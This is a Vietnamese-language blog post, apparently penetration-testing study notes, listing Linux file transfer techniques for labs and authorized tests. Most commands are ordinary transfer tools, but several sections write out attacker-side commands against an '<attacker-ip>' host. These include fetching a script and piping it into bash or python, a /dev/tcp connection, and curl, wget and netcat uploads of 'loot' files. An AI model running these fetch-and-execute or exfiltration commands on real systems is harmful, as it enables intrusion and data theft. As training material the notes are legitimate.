---
layout: post
title: "Linux File Transfer Methods"
render_with_liquid: false
categories:
  - File Transfer
tags:
  - file-transfer
  - linux
source_collection: manual
---
Topics: Linux, File Transfer

## Overview

Ghi chú nhanh các cách chuyển file trên Linux trong môi trường lab hoặc hệ thống được phép kiểm thử. Trước khi chọn phương pháp, cần xác định rõ:

- Download: đưa file từ server về Linux target
- Upload: đưa file từ Linux target về máy của mình
- Internal copy: copy giữa các host Linux hoặc qua share/protocol trung gian

Linux thường có nhiều công cụ native để truyền file. Trong incident response thực tế, threat actor cũng hay dùng pattern fallback: thử `curl` trước, nếu fail thì thử `wget`, nếu tiếp tục fail thì dùng `python` để tải payload qua `HTTP` hoặc `HTTPS`. Vì vậy, khi phòng thủ cần giám sát cả command line, process tree, network egress, và user-agent bất thường chứ không chỉ một binary cụ thể.

Mặc dù Linux có thể truyền file qua FTP, SMB, SSH, rsync, netcat, và nhiều protocol khác, HTTP/HTTPS vẫn là lựa chọn phổ biến nhất vì thường được firewall cho phép đi ra ngoài.

## Quick Checklist

- Kiểm tra target có outbound HTTP/HTTPS không.
- Kiểm tra có sẵn `wget`, `curl`, `scp`, `sftp`, `rsync`, `nc`, `python3`, `python2`, `php`, `ruby`, `ftp`, hoặc `tftp` không.
- Kiểm tra shell có interactive hay chỉ chạy được command một dòng.
- Kiểm tra path có quyền ghi, ví dụ `/tmp`, `/var/tmp`, `/dev/shm`, hoặc home directory.
- Luôn verify hash sau khi transfer file binary, archive, key, hoặc dữ liệu quan trọng.

## Download Operations

Download là đưa file từ máy của mình hoặc server trung gian về Linux target.

## HTTP Server On Attacker

Trên máy của mình, serve thư mục hiện tại bằng Python 3:

```bash
python3 -m http.server 8000
```

Nếu chỉ có Python 2:

```bash
python2 -m SimpleHTTPServer 8000
```

Một số web server tạm thời khác:

```bash
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Các mini web server này linh hoạt cho lab, nhưng cần nhớ traffic inbound có thể bị firewall chặn. Nếu chạy server trên target để máy mình tải file về, về bản chất đó là Pwnbox download từ target, không phải target upload trực tiếp.

## Wget Download

```bash
wget http://<attacker-ip>:8000/tool -O /tmp/tool
chmod +x /tmp/tool
```

Download vào file cùng tên:

```bash
wget http://<attacker-ip>:8000/file.txt
```

## Curl Download

```bash
curl -o /tmp/tool http://<attacker-ip>:8000/tool
chmod +x /tmp/tool
```

Follow redirect nếu cần:

```bash
curl -L -o /tmp/file.txt http://<attacker-ip>:8000/file.txt
```

## Python Download

Nếu không có `curl` hoặc `wget` nhưng có Python:

```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<attacker-ip>:8000/file.txt", "/tmp/file.txt")'
```

Python 2:

```bash
python2 -c 'import urllib; urllib.urlretrieve("http://<attacker-ip>:8000/file.txt", "/tmp/file.txt")'
```

Fallback một dòng thường gặp trong lab:

```bash
curl -o /tmp/file http://<attacker-ip>:8000/file || wget http://<attacker-ip>:8000/file -O /tmp/file || python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<attacker-ip>:8000/file", "/tmp/file")'
```

## Fileless Web Download

Do pipe trong Linux hoạt động linh hoạt, có thể tải script text và đưa trực tiếp vào interpreter mà không ghi script xuống disk theo đường tải thông thường.

Với `curl`:

```bash
curl http://<attacker-ip>:8000/script.sh | bash
```

Với `wget`:

```bash
wget -qO- http://<attacker-ip>:8000/script.py | python3
```

Lưu ý: cách pipe có thể tránh tạo file script ban đầu, nhưng payload bên trong vẫn có thể tự tạo file tạm, ví dụ các payload dùng `mkfifo`. Chỉ chạy script bạn kiểm soát và trong môi trường được phép.

## Bash TCP Download

Khi không có `wget` hoặc `curl`, có thể dùng `/dev/tcp` nếu Bash hỗ trợ network redirection. Tính năng này cần Bash 2.04+ và binary được build với `--enable-net-redirections`.

```bash
exec 3<>/dev/tcp/<attacker-ip>/8000
echo -e "GET /file.txt HTTP/1.1\nHost: <attacker-ip>\n\n" >&3
cat <&3 > /tmp/http-response.txt
```

Cách này sẽ lưu cả HTTP headers; cần cắt phần body trước khi dùng file.

Nếu chỉ muốn xem response:

```bash
exec 3<>/dev/tcp/<attacker-ip>/80
echo -e "GET /file.txt HTTP/1.1\n\n" >&3
cat <&3
```

## SSH Server Setup

Nếu máy của mình/Pwnbox sẽ nhận kết nối SSH, cần bật SSH server:

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

Kiểm tra port 22 đang listen:

```bash
ss -lnpt | grep ':22'
```

Nếu hệ thống chưa có `ss`, có thể dùng:

```bash
netstat -lnpt | grep ':22'
```

Nên tạo user tạm thời cho transfer file thay vì dùng credential hoặc private key chính.

## SCP Download

```bash
scp user@<server-ip>:/tmp/tool /tmp/tool
chmod +x /tmp/tool
```

Nếu SSH chạy port khác:

```bash
scp -P 2222 user@<server-ip>:/tmp/tool /tmp/tool
```

## SFTP Download

```bash
sftp user@<server-ip>
get /tmp/tool /tmp/tool
exit
```

## Rsync Download

```bash
rsync -avz user@<server-ip>:/tmp/files/ /tmp/files/
```

`rsync` phù hợp khi cần copy nhiều file hoặc đồng bộ thư mục.

## Netcat Download

Trên máy gửi:

```bash
nc -lvnp 9001 < tool
```

Trên Linux target:

```bash
nc <attacker-ip> 9001 > /tmp/tool
chmod +x /tmp/tool
```

Một số bản netcat dùng option khác nhau; nếu `-N` có sẵn, có thể dùng để đóng kết nối sau khi gửi xong.

## Base64 Download

Khi chỉ copy/paste được text, encode file ở máy nguồn. Kiểm tra hash trước:

```bash
md5sum tool
cat tool | base64 -w 0; echo
```

Decode trên Linux target:

```bash
echo -n "<base64-data>" | base64 -d > /tmp/tool
md5sum /tmp/tool
chmod +x /tmp/tool
```

Hash trước và sau nên giống nhau. Base64 phù hợp cho file nhỏ; với file lớn nên dùng HTTP, SCP, rsync, hoặc SMB.

## FTP Download

```bash
ftp <ftp-server>
binary
get file.txt
bye
```

Command một dòng với `curl`:

```bash
curl -o /tmp/file.txt ftp://<ftp-server>/file.txt
```

## TFTP Download

```bash
tftp <tftp-server> -c get file.txt /tmp/file.txt
```

TFTP thường bị firewall chặn và không có authentication.

## SMB Download

Nếu có `smbclient`:

```bash
smbclient //<smb-server>/share -U '<domain>/<user>'
get file.txt /tmp/file.txt
exit
```

Command một dòng:

```bash
smbclient //<smb-server>/share -U '<domain>/<user>' -c 'get file.txt /tmp/file.txt'
```

## Upload Operations

Upload là đưa file từ Linux target về máy của mình hoặc server trung gian.

## Wget Upload

Nếu server hỗ trợ HTTP PUT:

```bash
wget --method=PUT --body-file=/tmp/loot.txt http://<attacker-ip>:8000/loot.txt
```

## Curl Upload

Upload dạng multipart:

```bash
curl -X POST -F "file=@/tmp/loot.txt" http://<attacker-ip>:8000/upload
```

Upload dạng raw body:

```bash
curl --upload-file /tmp/loot.txt http://<attacker-ip>:8000/loot.txt
```

## Python Upload Server

Trên máy nhận:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Trên Linux target:

```bash
curl -X POST -F "files=@/tmp/loot.txt" http://<attacker-ip>:8000/upload
```

## HTTPS Upload Server

Nếu muốn upload qua HTTPS trong lab, tạo self-signed certificate trên máy nhận:

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Nên chạy web server trong thư mục riêng, không để lẫn certificate với webroot:

```bash
mkdir https
cd https
python3 -m uploadserver 443 --server-certificate ../server.pem
```

Upload nhiều file từ Linux target:

```bash
curl -X POST https://<attacker-ip>/upload -F 'files=@/tmp/file1.txt' -F 'files=@/tmp/file2.txt' --insecure
```

`--insecure` chỉ dùng khi bạn chủ động dùng self-signed certificate trong lab. Trong môi trường thật, nên dùng certificate hợp lệ.

## Web Pull From Target

Nếu target có Python/PHP/Ruby và inbound traffic được phép, có thể chạy web server tạm trên target rồi tải file từ Pwnbox:

```bash
cd /tmp
python3 -m http.server 8000
```

Hoặc:

```bash
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
```

Trên Pwnbox:

```bash
wget http://<target-ip>:8000/loot.txt -O loot.txt
```

Kỹ thuật này hữu ích khi upload trực tiếp khó triển khai, nhưng vẫn phụ thuộc firewall inbound vào target.

## SCP Upload

```bash
scp /tmp/loot.txt user@<server-ip>:/tmp/loot.txt
```

Nếu SSH chạy port khác:

```bash
scp -P 2222 /tmp/loot.txt user@<server-ip>:/tmp/loot.txt
```

## SFTP Upload

```bash
sftp user@<server-ip>
put /tmp/loot.txt /tmp/loot.txt
exit
```

## Rsync Upload

```bash
rsync -avz /tmp/files/ user@<server-ip>:/tmp/files/
```

## Netcat Upload

Trên máy nhận:

```bash
nc -lvnp 9001 > loot.txt
```

Trên Linux target:

```bash
nc <attacker-ip> 9001 < /tmp/loot.txt
```

Nếu có `ncat`:

```bash
ncat <attacker-ip> 9001 < /tmp/loot.txt
```

## Base64 Upload

Encode trên Linux target:

```bash
base64 -w 0 /tmp/loot.txt
```

Decode trên máy nhận:

```bash
echo "<base64-data>" | base64 -d > loot.txt
```

## FTP Upload

```bash
ftp <ftp-server>
binary
put /tmp/loot.txt loot.txt
bye
```

Hoặc dùng `curl`:

```bash
curl -T /tmp/loot.txt ftp://<ftp-server>/loot.txt
```

## SMB Upload

Nếu có `smbclient`:

```bash
smbclient //<smb-server>/share -U '<domain>/<user>' -c 'put /tmp/loot.txt loot.txt'
```

## Verify File Integrity

Tính hash trên Linux:

```bash
sha256sum /tmp/tool
md5sum /tmp/tool
```

Tính hash trên Windows hoặc máy nhận nếu cần đối chiếu:

```powershell
Get-FileHash C:\Windows\Temp\tool.exe -Algorithm SHA256
```

Hash hai bên nên giống nhau trước khi chạy file hoặc dùng dữ liệu đã transfer.

## Notes

- HTTP/HTTPS thường nhanh nhất để download trong lab.
- SCP/SFTP/rsync phù hợp khi đã có SSH credential.
- Netcat hữu ích khi cần phương án đơn giản, nhưng không có mã hóa và dễ bị firewall chặn.
- Base64 hữu ích trong shell hạn chế, nhưng không phù hợp cho file lớn.
- SMB phù hợp khi cần tương tác với Windows share hoặc mixed environment.
